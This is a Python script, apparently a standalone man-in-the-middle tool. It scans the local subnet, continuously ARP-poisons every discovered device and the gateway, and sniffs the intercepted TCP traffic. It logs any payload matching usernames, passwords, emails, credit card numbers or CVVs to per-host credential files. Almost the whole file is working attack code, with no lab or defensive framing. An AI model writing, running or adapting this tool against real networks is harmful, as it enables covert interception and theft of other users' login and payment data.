import os
import sys
import threading
import netifaces
import time
from colorama import init, Fore, Style
import re
import subprocess

# Auto-install modules if not present
def install_and_import(package):
    try:
        __import__(package)
    except ImportError:
        os.system(f"{sys.executable} -m pip install {package}")
        __import__(package)

for module in ['scapy.all', 'netifaces', 'colorama']:  # Added 'pyshark'
    install_and_import(module)

from scapy.all import *

init(autoreset=True)

# Display interfaces recognized by Scapy with IPs
def list_scapy_interfaces():
    interfaces = get_if_list()
    interface_info = {}
    print(Fore.CYAN + "[+] Interfaces Recognized by Scapy:")
    for idx, interface in enumerate(interfaces):
        try:
            ip_address = get_if_addr(interface)
        except:
            ip_address = '0.0.0.0'
        interface_info[interface] = ip_address
        print(Fore.YELLOW + f"{idx + 1}. {interface} - {ip_address}")
    return interface_info

# Ping IP to verify connection
def ping_ip(ip):
    try:
        output = subprocess.check_output(["ping", "-n", "1", "-w", "1000", ip], stderr=subprocess.DEVNULL).decode()
        return "TTL=" in output
    except subprocess.CalledProcessError:
        return False

# Network scanner with ping verification
def network_scanner(ip_range, local_subnet):
    print(Fore.CYAN + f"[+] Scanning network at {ip_range}...")
    answered, _ = arping(ip_range, timeout=5, verbose=False)
    devices = [{'ip': received.psrc, 'mac': received.hwsrc} for sent, received in answered]

    print(Fore.CYAN + "[+] Verifying active devices with ping...")
    active_devices = []
    for device in devices:
        if device['ip'].startswith(local_subnet):
            if ping_ip(device['ip']):
                active_devices.append(device)
                print(f"[+] Active Device Found: IP: {device['ip']}, MAC: {device['mac']}")
            else:
                print(f"[-] Inactive Device Skipped: IP: {device['ip']}, MAC: {device['mac']}")
        else:
            print(f"[-] Out of Scope Device Skipped: IP: {device['ip']}, MAC: {device['mac']}")

    if not active_devices:
        print(Fore.YELLOW + "[!] No active devices detected via ARP. Checking ARP table...")
        arp_table = subprocess.check_output("arp -a", shell=True).decode()
        for line in arp_table.splitlines():
            match = re.match(r'(\d+\.\d+\.\d+\.\d+)\s+([a-fA-F0-9:-]{17})', line)
            if match:
                ip, mac = match.groups()
                if ip.startswith(local_subnet) and ping_ip(ip):
                    active_devices.append({'ip': ip, 'mac': mac})
                    print(f"[+] Active Device from ARP Table: IP: {ip}, MAC: {mac}")

    return active_devices

# Get MAC address
def get_mac(ip):
    arp_request = ARP(op=1, pdst=ip)
    answered, _ = sr(arp_request, timeout=5, verbose=False)
    return answered[0][1].hwsrc if answered else None

# ARP Poisoning
def arp_poison(target_ip, target_mac, source_ip, source_mac, interface):
    poison_packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
    send(poison_packet, verbose=False, iface=interface, loop=0)

# Restore ARP
def restore_arp(target_ip, target_mac, source_ip, source_mac, interface):
    restore_packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
    send(restore_packet, count=4, verbose=False, iface=interface)

# Packet Sniffer
def packet_sniffer(interface):
    sniff(iface=interface, prn=process_packet, store=False, filter="tcp")

# Process packets
def process_packet(packet):
    if packet.haslayer(Raw):
        try:
            payload = packet[Raw].load.decode('utf-8', errors='ignore')
            if re.search(r'(?i)(username|user|userid|password|pass|pwd|login|email|creditcard|card number|cvv|payment)', payload):
                log_sensitive_data(packet, payload)
        except UnicodeDecodeError:
            pass
    if packet.haslayer(IP):
        log_packet(packet)
        print(f"\r[+] Packet: {packet.summary()}   ", end='')

# Log packets
def log_packet(packet):
    src_ip = packet[IP].src
    log_dir = "logs"
    if not os.path.exists(log_dir):
        os.makedirs(log_dir)
    with open(os.path.join(log_dir, f"{src_ip}.log"), 'a') as f:
        f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {packet.summary()}\n")

# Log sensitive data
def log_sensitive_data(packet, payload):
    src_ip = packet[IP].src
    log_dir = "logs"
    if not os.path.exists(log_dir):
        os.makedirs(log_dir)
    with open(os.path.join(log_dir, f"{src_ip}_credentials.log"), 'a') as f:
        f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {payload}\n")
    print(Fore.YELLOW + f"\r[!] Sensitive Data Detected: {payload}   ", end='')

# Monitor network changes
def monitor_network_changes(interface, known_devices):
    while True:
        current_devices = network_scanner(f"{local_subnet}.0/24", local_subnet)
        current_macs = {device['mac'] for device in current_devices}

        new_macs = current_macs - known_devices
        if new_macs:
            for new_mac in new_macs:
                print(Fore.MAGENTA + f"[!] New device detected on network: MAC: {new_mac}")
                with open("logs/new_devices.log", 'a') as f:
                    f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - New device detected: MAC: {new_mac}\n")
            known_devices.update(new_macs)
        time.sleep(10)

# Main execution
if __name__ == "__main__":
    if not os.path.exists("logs"): os.makedirs("logs")
    interfaces = list_scapy_interfaces()
    if not interfaces:
        print(Fore.RED + "[!] No interfaces recognized by Scapy."); sys.exit(0)
    try:
        selected_idx = int(input(Fore.CYAN + "\nSelect interface number (from Scapy list): ")) - 1
        selected_interface = list(interfaces.keys())[selected_idx]
        selected_ip = interfaces[selected_interface]
    except (ValueError, IndexError):
        print(Fore.RED + "[!] Invalid selection."); sys.exit(0)

    ip_parts = selected_ip.split('.')
    local_subnet = f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}"
    ip_range = f"{local_subnet}.0/24"

    devices = network_scanner(ip_range, local_subnet)
    if not devices:
        print(Fore.RED + "[!] No devices found."); sys.exit(0)

    print(Fore.GREEN + "[+] Active Devices:")
    for idx, device in enumerate(devices):
        print(f"{idx + 1}. IP: {device['ip']}, MAC: {device['mac']}")

    GATEWAY_IP = input(Fore.CYAN + "\nEnter Gateway IP: ")
    gateway_mac = get_mac(GATEWAY_IP)
    if not gateway_mac:
        print(Fore.RED + "[!] Cannot find gateway MAC."); sys.exit(0)

    print(Fore.CYAN + "[+] Starting ARP poisoning...")
    try:
        sniff_thread = threading.Thread(target=packet_sniffer, args=(selected_interface,))
        sniff_thread.daemon = True
        sniff_thread.start()

        known_devices = {device['mac'] for device in devices}
        monitor_thread = threading.Thread(target=monitor_network_changes, args=(selected_interface, known_devices))
        monitor_thread.daemon = True
        monitor_thread.start()

        while True:
            for device in devices:
                if device['ip'] != GATEWAY_IP:
                    arp_poison(device['ip'], device['mac'], GATEWAY_IP, get_if_hwaddr(selected_interface), selected_interface)
                    arp_poison(GATEWAY_IP, gateway_mac, device['ip'], get_if_hwaddr(selected_interface), selected_interface)
                    print(f"\r[!] ARP Poisoning {device['ip']} ({device['mac']})   ", end='')
            time.sleep(2)
    except KeyboardInterrupt:
        print(Fore.GREEN + "\n[+] Stopping ARP poisoning and restoring ARP tables...")
        for device in devices:
            restore_arp(device['ip'], device['mac'], GATEWAY_IP, gateway_mac, selected_interface)
            restore_arp(GATEWAY_IP, gateway_mac, device['ip'], device['mac'], selected_interface)
        sys.exit(0)
